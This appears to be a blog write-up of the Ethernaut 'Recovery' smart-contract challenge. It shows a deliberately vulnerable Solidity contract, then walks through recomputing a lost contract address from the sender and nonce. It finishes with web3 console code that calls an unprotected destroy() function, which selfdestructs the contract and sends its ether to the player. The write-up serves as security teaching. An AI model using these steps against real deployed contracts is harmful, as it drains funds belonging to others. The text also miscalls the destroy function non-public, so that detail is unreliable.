@@ -1,0 +1,68 @@
+<!doctype html><html lang=en><head><title>Recovery - Ethernaut :: DimitrisV SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether. At first, we check the code:
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg."><meta name=keywords content="linux"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/recovery/><link rel=stylesheet href=/assets/style.css><link rel=stylesheet href=/assets/pink.css><link rel=apple-touch-icon href=/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content="DimitrisV"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Recovery - Ethernaut"><meta property="og:description" content="On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether. At first, we check the code:
+// SPDX-License-Identifier: MIT pragma solidity ^0.8.11; import &amp;#39;@openzeppelin/contracts/math/SafeMath.sol&amp;#39;; contract Recovery { //generate tokens function generateToken(string memory _name, uint256 _initialSupply) public { new SimpleToken(_name, msg."><meta property="og:url" content="/blockchain_writeups/recovery/"><meta property="og:site_name" content="DimitrisV SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2022-01-30 00:00:00 +0000 UTC"></head><body class=pink><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>DimitrisV SV1SJP</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about.html>About</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about.html>About</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=/blockchain_writeups/recovery/>Recovery - Ethernaut</a></h1><div class=post-meta><span class=post-date>2022-01-30</span>
+<span class=post-author>:: DimitrisV</span></div><div class=post-content><div><p>On this challenge, we have a smart-contract that can built very simple tokens by its own. Anyone can create new tokens with ease. The point of this contract is to find the lost contract address and then withdraw all of its ether.
+At first, we check the code:</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.11;
+
+import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;;
+
+contract Recovery {
+
+  //generate tokens
+  function generateToken(string memory _name, uint256 _initialSupply) public {
+    new SimpleToken(_name, msg.sender, _initialSupply);
+  
+  }
+}
+
+contract SimpleToken {
+
+  using SafeMath for uint256;
+  // public variables
+  string public name;
+  mapping (address =&gt; uint) public balances;
+
+  // constructor
+  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
+    name = _name;
+    balances[_creator] = _initialSupply;
+  }
+
+  // collect ether in return for tokens
+  receive() external payable {
+    balances[msg.sender] = msg.value.mul(10);
+  }
+
+  // allow transfers of tokens
+  function transfer(address _to, uint _amount) public { 
+    require(balances[msg.sender] &gt;= _amount);
+    balances[msg.sender] = balances[msg.sender].sub(_amount);
+    balances[_to] = _amount;
+  }
+
+  // clean up after ourselves
+  function destroy(address payable _to) public {
+    selfdestruct(_to);
+  }
+}
+</code></pre><p>We can see that this smart contract has a destroy function with a selfdestruct() operator on it. However, the function destroy is not public payable. That means we can&rsquo;t simply make a transaction and call it. We should find the address and then call it by using the contract&rsquo;s address. We know that contract addresses are deterministically calculated. From Ethereum&rsquo;s yellow paper we can read: &ldquo;The address of the new account is defined as being the rightmost 160 bits of the Keccak hash of the RLP encoding of the structure containing only the sender and the account nonce. Thus we define the resultant address for the new account&rdquo;.
+We can represent this function as:</p><pre tabindex=0><code>address = rightmost_20_bytes(keccak(RLP(sender address, nonce)))
+</code></pre><p>On which:</p><ul><li>&ldquo;sender address&rdquo; is the contract or wallet address that created this new contract. So, we can type in console &ldquo;contract.address&rdquo; and find it easily.</li><li>&ldquo;nonce&rdquo; is the number of the transactions sent from the &ldquo;sender address&rdquo; or if the sender an another smart-contract, the &ldquo;nonce&rdquo; is the number of contract-creations made by this account.</li><li>&ldquo;RLP&rdquo; is an encoder on data structure and is the default to serialize objects in Ethereum. The RLP encoding of a 20-byte address is 0xd6,0x94. Moreover, for all intenger less than 0x7f, its encoding its just its own byte value. As result, the RLP of 1 is 0x01. We keep that in mind for the next step.</li><li>&ldquo;keccak&rdquo; is the cryptographic primitive that compute the Ethereum SHA3 hash on any input. Is also refered as Keccak-256.</li></ul><p>So now we can recalculate the address of the new contract by an existing contract located at the contract.address. It should be mentioned that the nonce 0 is always the event of smart contract&rsquo;s creation. So, we will begin to counting from 1. We know that RLP of 1 is 0x01, so by using the web3 utils, we will try to use the function we described above:</p><pre tabindex=0><code>web3.utils.soliditySha3(&#34;0xd6&#34;, &#34;0x94&#34;, &#34;0xEa90EAAAB78241373b94C98a788524582DA2e593&#34; , &#34;0x01&#34;)
+</code></pre><p>This will return this hexademical:</p><pre tabindex=0><code class="language-'0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331'" data-lang="'0xa1ed98d854d1b4ee7a4aa44816a095b1578566ec7fd216246a8c0a6322f67331'"></code></pre><p>We will keep only the last 40 characters :</p><pre tabindex=0><code>16a095b1578566ec7fd216246a8c0a6322f67331 
+</code></pre><p>Then we have the smart contract address. Now we can check in Etherscan.io this address and we can find out that it has 0.01 ether inside. As we have the address now we can try to call the destruct function. Therefore, we will encode a function call from console:</p><pre tabindex=0><code>data = web3.eth.abi.encodeFunctionCall({
+    name: &#39;destroy&#39; ,
+    type: &#39;function&#39;,
+    inputs: [{
+        type: &#39;address&#39;,
+        name: &#39;_to&#39; }] 
+}, [player]);
+</code></pre><p>And then we will create a transaction having our own player address in order to be sent to us the smart&rsquo;s contract ether when we trigger selfdestruct() operation:</p><pre tabindex=0><code>await web3.eth.sendTransaction({
+    to: &#34;0x16a095B1578566ec7fd216246A8C0A6322F67331&#34;,
+    from: player,
+    data: data } )
+</code></pre><p>We pay the transaction fees and now we transfer all of the contract&rsquo;s ether to our wallet.
+From this challenge, we learnt that we can send Ethers to a deterministic address, when the contract does not exist, at least for now.</p><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><a href=https://github.com/sv1sjp/eVoting_Elections_Decentralized_App/blob/main/smartcontract_security_paper.pdf>Smart Contract Security: Dimitris Vagiakakakos, Stavros Gkinos, Ioannis Karvelas</a></li></ul><ul><li><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational YouTube Series in Greek - Click Here</a></li></ul></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>Dimitris LinuxOS 2011-2022</span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=/assets/main.js></script>
+<script src=/assets/prism.js></script>
+<script src=/assets/languageSelector.js></script></div></body></html>
